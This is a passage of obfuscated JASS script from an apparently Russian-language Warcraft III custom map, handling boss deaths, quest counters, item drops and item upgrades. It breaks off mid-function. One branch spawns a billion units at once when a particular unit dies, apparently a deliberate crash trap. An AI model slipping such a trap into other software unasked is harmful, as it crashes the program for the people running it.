function nv takes nothing returns boolean
if not (CountUnitsInGroup(Th)>=1) then
return false
endif
return true
endfunction
function nw takes nothing returns nothing
if nv() then
call IssueTargetOrderBJ(GetAttacker(),"attack",GroupPickRandomUnit(Th))
call DestroyGroup(Th)
else
endif
endfunction
function nx takes nothing returns boolean
if not (CountUnitsInGroup(Th)>=1) then
return false
endif
return true
endfunction
function ny takes nothing returns nothing
if nx() then
call IssueTargetOrderBJ(GetAttacker(),"attack",GroupPickRandomUnit(Th))
call DestroyGroup(Th)
else
set Th=GetUnitsInRangeOfLocMatching(1300.,Ub,Condition(function nu))
call ForGroupBJ(Th,function nw)
endif
endfunction
function nz takes nothing returns boolean
if not (IsUnitInGroup(GetAttackedUnitBJ(),To)==false) then
return false
endif
return true
endfunction
function n0 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if nz() then
set Ub=GetUnitLoc(GetTriggerUnit())
set Th=GetUnitsInRangeOfLocMatching(1300.,Ub,Condition(function nt))
call ForGroupBJ(Th,function ny)
call DestroyGroup(Th)
call RemoveLocation(Ub)
else
endif
call TriggerSleepAction(2.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function n1 takes nothing returns nothing
set Ua=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Ua,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(Ua,Condition(function ns))
call TriggerAddAction(Ua,function n0)
endfunction
function n2 takes nothing returns nothing
local unit Ud=GetTriggerUnit()
local unit Ue=GetKillingUnit()
local location Uf=GetUnitLoc(Ud)
local group Mc
local boolexpr No
local integer Np
local location Nt
local unit Ny
local effect Ot
local item Ou
local texttag Ov
if GetUnitTypeId(Ud)==$65303049 then
call EnableTrigger(Ug)
elseif GetUnitTypeId(Ud)==$68303354 then
set Mc=CreateGroup()
set No=Condition(function mx)
call GroupEnumUnitsInRect(Mc,Dj,No)
set Np=CountUnitsInGroup(Mc)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Mc=CreateGroup()
set No=Condition(function mw)
call GroupEnumUnitsInRect(Mc,Dj,No)
set Nu=Np*5000
call ForGroup(Mc,function nB)
call nh(LH,"|c00ff0000+"+I2S(Nu),.03,255,255,255)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
elseif GetUnitTypeId(Ud)==$6E303033 then
call GroupRemoveUnit(To,Ud)
elseif GetUnitTypeId(Ud)==$68303330 then
call DisplayTextToForce(GetPlayersAll(),"|c006969ffДемонов убито|r: 1/|c00ffff003|r")
set Nt=Location(-650,-12020)
set Ny=CreateUnitAtLoc(Player(11),$68303331,Nt,0)
set Ny=null
call RemoveLocation(Nt)
set Nt=null
elseif GetUnitTypeId(Ud)==$68303331 then
call DisplayTextToForce(GetPlayersAll(),"|c006969ffДемонов убито|r: 2/|c00ffff003|r")
set Nt=Location(-650,-12020)
set Ny=CreateUnitAtLoc(Player(11),$68303332,Nt,0)
set Ny=null
call RemoveLocation(Nt)
set Nt=null
elseif GetUnitTypeId(Ud)==$6830324F then
call DisableTrigger(Uh)
elseif GetUnitTypeId(Ud)==$6E303356 then
call TriggerSleepAction(5.)
call EnableTrigger(Ui)
set Nt=Location(GetRectCenterX(Cb),GetRectCenterY(Cb))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
elseif GetUnitTypeId(Ud)==$6E303352 then
call TriggerSleepAction(5.)
call EnableTrigger(Uj)
set Nt=Location(GetRectCenterX(BF),GetRectCenterY(BF))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
elseif GetUnitTypeId(Ud)==$6E303339 then
set Nt=Location(GetRectCenterX(CV),GetRectCenterY(CV))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
if GetRandomInt(1,100)<=MK*20 then
call CreateItem($72687468,GetLocationX(Uf),GetLocationY(Uf))
endif
if GetRandomInt(1,100)<=MK*20 then
call CreateItem($72617439,GetLocationX(Uf),GetLocationY(Uf))
endif
call EnableTrigger(Uk)
elseif GetUnitTypeId(Ud)==$6E30374A then
call TriggerSleepAction(5.)
call EnableTrigger(Ul)
set Nt=Location(GetRectCenterX(Fa),GetRectCenterY(Fa))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
elseif GetUnitTypeId(Ud)==$6E303749 then
call TriggerSleepAction(5.)
call EnableTrigger(Um)
set Nt=Location(GetRectCenterX(FY),GetRectCenterY(FY))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
elseif GetUnitTypeId(Ud)==$6E303537 then
call DisableTrigger(Un)
elseif GetUnitTypeId(Ud)==$6E303433 then
if IsUnitIllusion(Ud)==false then
call TriggerSleepAction(5.)
call EnableTrigger(Uo)
set Nt=Location(GetRectCenterX(Cu),GetRectCenterY(Cu))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
endif
elseif GetUnitTypeId(Ud)==$75303049 then
call TriggerSleepAction(5.)
call EnableTrigger(Up)
set Nt=Location(GetRectCenterX(Cc),GetRectCenterY(Cc))
set Ot=AddSpecialEffectLoc("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",Nt)
call RemoveLocation(Nt)
set Nt=null
set Ot=null
elseif Ud==Lk then
call DisableTrigger(Uq)
call EnableTrigger(Ur)
call DestroyEffect(Us[56])
set Us[56]=AddSpecialEffectTarget("war3mapImported\\QuestYellow1.mdx",J5,"origin")
elseif GetUnitTypeId(Ud)==$6E303456 then
call DisableTrigger(Ut)
elseif GetUnitTypeId(Ud)==$6E30304D then
set Ou=CreateItem($49303438,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif GetUnitTypeId(Ud)==$6E30304C then
set Ou=CreateItem($49303439,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif GetUnitTypeId(Ud)==$6E30304B then
set Ou=CreateItem($49303437,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Ud==KT then
set Ou=CreateItem($49303046,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif Ud==KS then
set Ou=CreateItem($49303045,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(Ud)==$6E303550 then
set Ou=CreateItem($49304B4D,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E30354F then
set Ou=CreateItem($49304B4B,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(Ud)==$6E30354E then
set Ou=CreateItem($49304B4C,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303247 then
set Ou=CreateItem($49303642,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303246 then
set Ou=CreateItem($49303639,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303245 then
set Ou=CreateItem($49303637,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303244 then
set Ou=CreateItem($49303632,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303243 then
set Ou=CreateItem($49303630,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$6E303242 then
set Ou=CreateItem($49303559,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$65303041 then
set Ou=CreateItem($49303555,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$65303039 then
set Ou=CreateItem($49303553,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetDyingUnit())==$65303038 then
set Ou=CreateItem($4930354F,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
elseif GetUnitTypeId(GetTriggerUnit())==$68303043 then
call CreateNUnitsAtLoc($3B9ACA00,$68706561,Player(PLAYER_NEUTRAL_AGGRESSIVE),GetRectCenter(GetPlayableMapRect()),bj_UNIT_FACING)
call CreateNUnitsAtLoc($3B9ACA00,$68706561,Player(PLAYER_NEUTRAL_AGGRESSIVE),GetRectCenter(GetPlayableMapRect()),bj_UNIT_FACING)
elseif GetUnitTypeId(Ud)==$6E303454 then
set Ny=K5
call UnitRemoveAbility(Ny,$41303736)
call UnitRemoveAbility(Ny,$41436D33)
set Ny=null
elseif GetUnitTypeId(Ud)==$68303351 or GetUnitTypeId(Ud)==$6830334F or GetUnitTypeId(Ud)==$68303350 or GetUnitTypeId(Ud)==$68303352 then
set Ny=K9
call ShowUnit(Ny,true)
call PauseUnit(Ny,false)
call SetUnitInvulnerable(Ny,false)
call DisableTrigger(Uu)
set Ny=null
elseif GetUnitTypeId(Ud)==$68303233 then
call DisableTrigger(Uv)
if GetUnitAbilityLevel(Ud,$4131394B)>=1 then
call BJDebugMsg("Мои поздравления! Хранительница Знаний умерла в сложном режиме!")
if GetRandomInt(1,100)<=MK*5 then
call BJDebugMsg("|c00ffff00Удача!|r Вам выпал |c007d7d7dТемный Гримуар!")
set Ou=CreateItem($736B7274,GetLocationX(Uf),GetLocationY(Uf))
call SetItemUserData(Ou,10)
set Ou=null
endif
endif
elseif GetUnitTypeId(Ud)==$68303045 then
call DisableTrigger(Uw)
elseif GetUnitTypeId(Ud)==$6E303548 then
call DisableTrigger(Ux)
elseif GetUnitTypeId(Ud)==$6E303539 then
call DisableTrigger(Uy)
elseif GetUnitTypeId(Ud)==$6E303754 then
call DisableTrigger(Uz)
call UnitAddAbility(J9,$41706974)
call UnitAddAbility(J9,$416E6532)
elseif GetUnitTypeId(Ud)==$6E303731 then
call SetUnitPathing(Ny,false)
call nD(Ny,10)
set Ny=null
elseif GetUnitTypeId(Ud)==$6E303555 then
call DisableTrigger(U0)
elseif GetUnitTypeId(Ud)==$6E303554 then
call DisableTrigger(U1)
elseif GetUnitTypeId(Ud)==$6E303553 then
call DisableTrigger(U2)
elseif GetUnitTypeId(Ud)==$68303141 then
if GetUnitAbilityLevel(Ud,$41666165)==2 then
if GetRandomInt(1,100)<=8*MK then
call CreateItem($73726264,GetLocationX(Uf),GetLocationY(Uf))
endif
if GetRandomInt(1,100)<=8*MK then
call CreateItem($6E737069,GetLocationX(Uf),GetLocationY(Uf))
endif
if GetRandomInt(1,100)<=8*MK then
call CreateItem($72656A31,GetLocationX(Uf),GetLocationY(Uf))
endif
if GetRandomInt(1,100)<=4*MK then
call CreateItem($6776736D,GetLocationX(Uf),GetLocationY(Uf))
set Ov=CreateTextTag()
call SetTextTagText(Ov,"|c00FF00FFВам выпал |c00ffff00Курьер",.03)
call SetTextTagPosUnit(Ov,Ud,50)
call SetTextTagColor(Ov,255,255,255,255)
call SetTextTagVelocity(Ov,0,.03)
call SetTextTagVisibility(Ov,true)
call SetTextTagFadepoint(Ov,2)
call SetTextTagLifespan(Ov,2)
call SetTextTagPermanent(Ov,false)
call SetTextTagSuspended(Ov,false)
set Ov=null
endif
endif
endif
if GetUnitAbilityLevel(Ud,$416C6F63)>=1 or GetUnitTypeId(Ud)==$68303037 or GetUnitTypeId(Ud)==$68303235 or GetUnitTypeId(Ud)==$68303038 then
call RemoveUnit(Ud)
endif
if nO(Ue,$6D6F6474) then
if GetUnitLevel(Ud)==6 then
call SetItemCharges(nP(Ue,$6D6F6474),GetItemCharges(nP(Ue,$6D6F6474))+1)
endif
endif
if nO(Ue,$636B6E67) then
if GetUnitLevel(Ud)==5 then
call SetItemCharges(nP(Ue,$636B6E67),GetItemCharges(nP(Ue,$636B6E67))+1)
endif
endif
if nO(Ue,$72646534) then
if GetUnitLevel(Ud)==4 then
call SetItemCharges(nP(Ue,$72646534),GetItemCharges(nP(Ue,$72646534))+1)
endif
endif
if nO(Ue,$64657363) then
if GetUnitLevel(Ud)==3 then
call SetItemCharges(nP(Ue,$64657363),GetItemCharges(nP(Ue,$64657363))+1)
endif
endif
if nO(Ue,$676F6C64) then
if GetUnitLevel(Ud)==2 then
call SetItemCharges(nP(Ue,$676F6C64),GetItemCharges(nP(Ue,$676F6C64))+1)
endif
endif
if nO(Ue,$726D6132) then
if GetUnitLevel(Ud)==1 then
call SetItemCharges(nP(Ue,$726D6132),GetItemCharges(nP(Ue,$726D6132))+1)
endif
endif
if GetUnitTypeId(Ud)==$6E677277 then
if nO(Ue,$70676865)==true then
call SetItemCharges(nP(Ue,$70676865),GetItemCharges(nP(Ue,$70676865))+1)
endif
if nO(Ue,$696E6673)==true then
call SetItemCharges(nP(Ue,$696E6673),GetItemCharges(nP(Ue,$696E6673))+1)
endif
if nO(Ue,$6D6E7374)==true then
call SetItemCharges(nP(Ue,$6D6E7374),GetItemCharges(nP(Ue,$6D6E7374))+1)
endif
elseif GetUnitTypeId(Ud)==$6E61646B then
if nO(Ue,$616E6B68)==true then
call SetItemCharges(nP(Ue,$616E6B68),GetItemCharges(nP(Ue,$616E6B68))+1)
endif
if nO(Ue,$70726573)==true then
call SetItemCharges(nP(Ue,$70726573),GetItemCharges(nP(Ue,$70726573))+1)
endif
if nO(Ue,$6667736B)==true then
call SetItemCharges(nP(Ue,$6667736B),GetItemCharges(nP(Ue,$6667736B))+1)
endif
elseif GetUnitTypeId(Ud)==$6E627A6B then
if nO(Ue,$70676D61)==true then
call SetItemCharges(nP(Ue,$70676D61),GetItemCharges(nP(Ue,$70676D61))+1)
endif
if nO(Ue,$73686172)==true then
call SetItemCharges(nP(Ue,$73686172),GetItemCharges(nP(Ue,$73686172))+1)
endif
if nO(Ue,$73616E64)==true then
call SetItemCharges(nP(Ue,$73616E64),GetItemCharges(nP(Ue,$73616E64))+1)
endif
elseif GetUnitTypeId(Ud)==$6E303047 then
if nO(Ue,$70646976)==true then
call SetItemCharges(nP(Ue,$70646976),GetItemCharges(nP(Ue,$70646976))+1)
endif
if nO(Ue,$66676668)==true then
call SetItemCharges(nP(Ue,$66676668),GetItemCharges(nP(Ue,$66676668))+1)
endif
if nO(Ue,$73726F72)==true then
call SetItemCharges(nP(Ue,$73726F72),GetItemCharges(nP(Ue,$73726F72))+1)
endif
elseif GetUnitTypeId(Ud)==$6E726472 then
if nO(Ue,$66677264)==true then
call SetItemCharges(nP(Ue,$66677264),GetItemCharges(nP(Ue,$66677264))+1)
endif
if nO(Ue,$73726573)==true then
call SetItemCharges(nP(Ue,$73726573),GetItemCharges(nP(Ue,$73726573))+1)
endif
if nO(Ue,$66676467)==true then
call SetItemCharges(nP(Ue,$66676467),GetItemCharges(nP(Ue,$66676467))+1)
endif
elseif GetUnitTypeId(Ud)==$6E303259 or GetUnitTypeId(Ud)==$6E303330 or GetUnitTypeId(Ud)==$6E303258 or GetUnitTypeId(Ud)==$6E30325A then
set UQ[12]=UQ[12]+1
if UQ[12]>=4 then
call SetUnitOwner(LQ,Player(11),true)
call SetUnitInvulnerable(LQ,false)
endif
endif
if nO(Ue,$6D6F6474) then
if GetItemCharges(nP(Ue,$6D6F6474))>=40 then
call RemoveItem(nP(Ue,$6D6F6474))
set NF=false
call UnitAddItemByIdSwapped($6F66726F,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$636B6E67) then
if GetItemCharges(nP(Ue,$636B6E67))>=40 then
call RemoveItem(nP(Ue,$636B6E67))
set NF=false
call UnitAddItemByIdSwapped($6D6F6474,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
elseif nO(Ue,$72646534) then
if GetItemCharges(nP(Ue,$72646534))>=40 then
call RemoveItem(nP(Ue,$72646534))
set NF=false
call UnitAddItemByIdSwapped($636B6E67,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
elseif nO(Ue,$64657363) then
if GetItemCharges(nP(Ue,$64657363))>=40 then
call RemoveItem(nP(Ue,$64657363))
set NF=false
call UnitAddItemByIdSwapped($72646534,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
elseif nO(Ue,$676F6C64) then
if GetItemCharges(nP(Ue,$676F6C64))>=40 then
call RemoveItem(nP(Ue,$676F6C64))
set NF=false
call UnitAddItemByIdSwapped($64657363,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
elseif nO(Ue,$726D6132) then
if GetItemCharges(nP(Ue,$726D6132))>=40 then
call RemoveItem(nP(Ue,$726D6132))
set NF=false
call UnitAddItemByIdSwapped($676F6C64,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$6D6E7374)==true then
if GetItemCharges(nP(Ue,$6D6E7374))>=15 then
call RemoveItem(nP(Ue,$6D6E7374))
set NF=false
call UnitAddItemByIdSwapped($6667736B,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$6667736B)==true then
if GetItemCharges(nP(Ue,$6667736B))>=15 then
call RemoveItem(nP(Ue,$6667736B))
set NF=false
call UnitAddItemByIdSwapped($73686172,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$73686172)==true then
if GetItemCharges(nP(Ue,$73686172))>=15 then
call RemoveItem(nP(Ue,$73686172))
set NF=false
call UnitAddItemByIdSwapped($66676668,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$66676668)==true then
if GetItemCharges(nP(Ue,$66676668))>=15 then
call RemoveItem(nP(Ue,$66676668))
set NF=false
call UnitAddItemByIdSwapped($73726573,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$73726573)==true then
if GetItemCharges(nP(Ue,$73726573))>=30 then
call RemoveItem(nP(Ue,$73726573))
set NF=false
call UnitAddItemByIdSwapped($73727263,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$696E6673)==true then
if GetItemCharges(nP(Ue,$696E6673))>=15 then
call RemoveItem(nP(Ue,$696E6673))
set NF=false
call UnitAddItemByIdSwapped($616E6B68,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$616E6B68)==true then
if GetItemCharges(nP(Ue,$616E6B68))>=15 then
call RemoveItem(nP(Ue,$616E6B68))
set NF=false
call UnitAddItemByIdSwapped($73616E64,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$73616E64)==true then
if GetItemCharges(nP(Ue,$73616E64))>=15 then
call RemoveItem(nP(Ue,$73616E64))
set NF=false
call UnitAddItemByIdSwapped($73726F72,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$73726F72)==true then
if GetItemCharges(nP(Ue,$73726F72))>=15 then
call RemoveItem(nP(Ue,$73726F72))
set NF=false
call UnitAddItemByIdSwapped($66676467,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$66676467)==true then
if GetItemCharges(nP(Ue,$66676467))>=30 then
call RemoveItem(nP(Ue,$66676467))
set NF=false
call UnitAddItemByIdSwapped($746F7477,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$70676865)==true then
if GetItemCharges(nP(Ue,$70676865))>=15 then
call RemoveItem(nP(Ue,$70676865))
set NF=false
call UnitAddItemByIdSwapped($70726573,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$70726573)==true then
if GetItemCharges(nP(Ue,$70726573))>=15 then
call RemoveItem(nP(Ue,$70726573))
set NF=false
call UnitAddItemByIdSwapped($70676D61,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$70676D61)==true then
if GetItemCharges(nP(Ue,$70676D61))>=15 then
call RemoveItem(nP(Ue,$70676D61))
set NF=false
call UnitAddItemByIdSwapped($70646976,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$70646976)==true then
if GetItemCharges(nP(Ue,$70646976))>=15 then
call RemoveItem(nP(Ue,$70646976))
set NF=false
call UnitAddItemByIdSwapped($66677264,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if nO(Ue,$66677264)==true then
if GetItemCharges(nP(Ue,$66677264))>=30 then
call RemoveItem(nP(Ue,$66677264))
set NF=false
call UnitAddItemByIdSwapped($6C6D6272,Ue)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl",Ue,"overhead"))
endif
endif
if GetOwningPlayer(Ud)==Player(PLAYER_NEUTRAL_AGGRESSIVE) then
set Np=GetRandomInt(1,80)
if Np==1 then
set Ou=CreateItem($4930354A,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==2 then
set Ou=CreateItem($4930354B,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
if GetUnitLevel(Ud)==5 then
if GetRandomInt(1,100)<=MK*1 then
set Ou=CreateItem($49305438,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
set Ov=CreateTextTag()
call SetTextTagText(Ov,"|cFF0080FFВам выпал |c00ffff00Элемент Драконов!",.03)
call SetTextTagPosUnit(Ov,Ud,50)
call SetTextTagColor(Ov,255,255,255,255)
call SetTextTagVelocity(Ov,0,.03)
call SetTextTagVisibility(Ov,true)
call SetTextTagFadepoint(Ov,2)
call SetTextTagLifespan(Ov,2)
call SetTextTagPermanent(Ov,false)
call SetTextTagSuspended(Ov,false)
call PlaySoundOnUnitBJ(C,100,GetTriggerUnit())
elseif GetRandomInt(1,100)<=MK*1 then
set Ou=CreateItem($49304143,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
set Ov=CreateTextTag()
call SetTextTagText(Ov,"|cFF0080FFВам выпало |c00ffff00Немного кожи!",.03)
call SetTextTagPosUnit(Ov,Ud,50)
call SetTextTagColor(Ov,255,255,255,255)
call SetTextTagVelocity(Ov,0,.03)
call SetTextTagVisibility(Ov,true)
call SetTextTagFadepoint(Ov,2)
call SetTextTagLifespan(Ov,2)
call SetTextTagPermanent(Ov,false)
call SetTextTagSuspended(Ov,false)
endif
elseif GetUnitLevel(Ud)==6 then
if Np==1 then
set Ou=CreateItem($4930324D,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==2 then
set Ou=CreateItem($49303454,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==3 then
set Ou=CreateItem($49303250,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==4 then
set Ou=CreateItem($4930324C,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($4930324F,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==6 then
set Ou=CreateItem($49303249,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($49303248,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==8 then
set Ou=CreateItem($4930324A,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==9 then
set Ou=CreateItem($49303247,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitLevel(Ud)==4 then
if Np==9 then
set Ou=CreateItem($49303238,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==8 then
set Ou=CreateItem($49303239,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($49303237,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==6 then
set Ou=CreateItem($49303244,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($49303246,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==4 then
set Ou=CreateItem($49303245,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitLevel(Ud)==3 then
if Np==4 then
set Ou=CreateItem($49303232,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==3 then
set Ou=CreateItem($49303233,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==2 then
set Ou=CreateItem($49303235,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==1 then
set Ou=CreateItem($49303234,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($4930315A,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitLevel(Ud)==2 then
if Np==5 then
set Ou=CreateItem($49303151,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==4 then
set Ou=CreateItem($49303153,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==3 then
set Ou=CreateItem($49303152,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==2 then
set Ou=CreateItem($4930314F,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==1 then
set Ou=CreateItem($4930314E,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==6 then
set Ou=CreateItem($4930314C,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($77696C6C,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==8 then
set Ou=CreateItem($706F6D6E,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitLevel(Ud)==1 then
if Np==6 then
set Ou=CreateItem($49303141,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==5 then
set Ou=CreateItem($49303144,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==4 then
set Ou=CreateItem($49303147,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==3 then
set Ou=CreateItem($49303146,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==2 then
set Ou=CreateItem($49303142,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==1 then
set Ou=CreateItem($49303148,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==7 then
set Ou=CreateItem($49303143,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==8 then
set Ou=CreateItem($49303149,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==9 then
set Ou=CreateItem($49303139,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==10 then
set Ou=CreateItem($49303145,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==11 then
set Ou=CreateItem($6473756D,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
elseif Np==12 then
set Ou=CreateItem($72646533,GetLocationX(Uf),GetLocationY(Uf))
set Ou=null
endif
elseif GetUnitTypeId(Ud)==$6E30344D or GetUnitTypeId(Ud)==$6E303249 then
if Np==10 then
